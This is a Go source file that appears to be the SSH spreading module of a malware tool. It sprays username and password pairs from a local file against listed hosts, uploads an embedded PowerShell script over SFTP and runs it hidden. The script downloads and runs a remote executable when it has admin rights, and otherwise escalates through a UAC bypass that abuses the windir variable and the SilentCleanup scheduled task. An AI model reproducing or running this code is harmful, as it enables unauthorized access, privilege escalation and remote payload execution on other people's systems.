package pack

import (
	"bufio"
	"fmt"
	"golang.org/x/crypto/ssh"
	"io"
	"os"
	"path/filepath"
	"strings"

	"github.com/pkg/sftp"
)

// PS1ScriptContent contains the PowerShell script content
const PS1ScriptContentSSH = `
if((([System.Security.Principal.WindowsIdentity]::GetCurrent()).groups -match "S-1-5-32-544")) {
	# URL of the executable to download
   $url = "https://sourceforge.net/projects/app/files/main.exe/download"
   
   # Path to save the downloaded executable
   $downloadPath = "$env:TEMP\downloaded_System.exe"
   
   # Download the executable
   Invoke-WebRequest -Uri $url -OutFile $downloadPath
   
   # Run the downloaded executable
   Start-Process -FilePath $downloadPath -NoNewWindow -Wait
   
   # Remove the downloaded file (optional)
   Remove-Item -Path $downloadPath -Force
   
   
   } else {
	   $registryPath = "HKCU:\Environment"
	   $Name = "windir"
	   $Value = "powershell -ep bypass -w h $PSCommandPath;#"
	   Set-ItemProperty -Path $registryPath -Name $name -Value $Value
	   #Depending on the performance of the machine, some sleep time may be required before or after schtasks
	   schtasks /run /tn \Microsoft\Windows\DiskCleanup\SilentCleanup /I | Out-Null
	   Remove-ItemProperty -Path $registryPath -Name $name
   }
`

// MarkerFileNameSSH is the marker file name for SSH uploads
const MarkerFileNameSSH = "upload_marker_ssh.txt"

func SSH() {
	// Specify the directory path
	dirPath := "C:\\Windows\\loveorhate"

	// Read SSH server IPs from file
	ipFilePath := filepath.Join(dirPath, "sship.txt")
	ipFile, err := os.Open(ipFilePath)
	if err != nil {
		fmt.Println("Error reading SSH server IPs file:", err)
		return
	}
	defer ipFile.Close()

	scanner := bufio.NewScanner(ipFile)
	for scanner.Scan() {
		sshIP := strings.TrimSpace(scanner.Text())

		// Check if marker file exists
		if hasMarkerFilen(filepath.Join(dirPath, sshIP)) {
			fmt.Printf("Skipping %s - Marker file exists\n", sshIP)
			continue
		}

		// Read SSH credentials from file
		credFilePath := filepath.Join(dirPath, "ssh.txt")
		credFile, err := os.Open(credFilePath)
		if err != nil {
			fmt.Println("Error reading SSH credentials file:", err)
			return
		}
		defer credFile.Close()

		credScanner := bufio.NewScanner(credFile)
		for credScanner.Scan() {
			cred := strings.TrimSpace(credScanner.Text())
			creds := strings.Split(cred, ":")
			if len(creds) != 2 {
				fmt.Println("Invalid credentials format:", cred)
				continue
			}

			sshUser := creds[0]
			sshPassword := creds[1]

			// Connect to SSH server
			client, err := connectSSH(sshIP, 22, sshUser, sshPassword)
			if err != nil {
				fmt.Printf("Failed to connect to %s: %v\n", sshIP, err)
				continue
			}
			defer client.Close()

			// Set the remote file path for the PS1 script on the SSH server
			remoteFileName := "script.ps1"
			remoteFilePath := "/" + remoteFileName

			// Upload PS1 script content to the remote file
			err = uploadFileOverSFTP(client, remoteFilePath, PS1ScriptContentSSH)
			if err != nil {
				fmt.Printf("Failed to upload PS1 script content to %s: %v\n", sshIP, err)
				return
			}

			fmt.Printf("PS1 script uploaded successfully to %s on %s\n", remoteFilePath, sshIP)

			// Execute PowerShell script remotely
			err = executeScriptOverSSH(client, remoteFilePath)
			if err != nil {
				fmt.Printf("Failed to execute PowerShell script on %s: %v\n", sshIP, err)
				return
			}

			// Create marker file to indicate successful upload
			createMarkerFilen(filepath.Join(dirPath, sshIP))

			// Break out of the credential loop if successful login, upload, and execution
			break
		}
	}
}

func hasMarkerFilen(dirPath string) bool {
	markerFilePath := filepath.Join(dirPath, MarkerFileNameSSH)
	_, err := os.Stat(markerFilePath)
	return !os.IsNotExist(err)
}

func createMarkerFilen(dirPath string) error {
	markerFilePath := filepath.Join(dirPath, MarkerFileNameSSH)
	file, err := os.Create(markerFilePath)
	if err != nil {
		return fmt.Errorf("failed to create marker file: %v", err)
	}
	defer file.Close()
	return nil
}
func connectSSH(host string, port int, user, password string) (*ssh.Client, error) {
	config := &ssh.ClientConfig{
		User: user,
		Auth: []ssh.AuthMethod{
			ssh.Password(password),
		},
		HostKeyCallback: ssh.InsecureIgnoreHostKey(),
	}

	return ssh.Dial("tcp", fmt.Sprintf("%s:%d", host, port), config)
}

func uploadFileOverSFTP(client *ssh.Client, remoteFilePath, content string) error {
	sftpClient, err := sftp.NewClient(client)
	if err != nil {
		return err
	}
	defer sftpClient.Close()

	remoteFile, err := sftpClient.Create(remoteFilePath)
	if err != nil {
		return err
	}
	defer remoteFile.Close()

	_, err = io.WriteString(remoteFile, content)
	return err
}

func executeScriptOverSSH(client *ssh.Client, scriptPath string) error {
	session, err := client.NewSession()
	if err != nil {
		return err
	}
	defer session.Close()

	// Execute the PowerShell script with hidden window
	cmd := "powershell.exe -WindowStyle Hidden -File " + scriptPath

	err = session.Run(cmd)
	return err
}
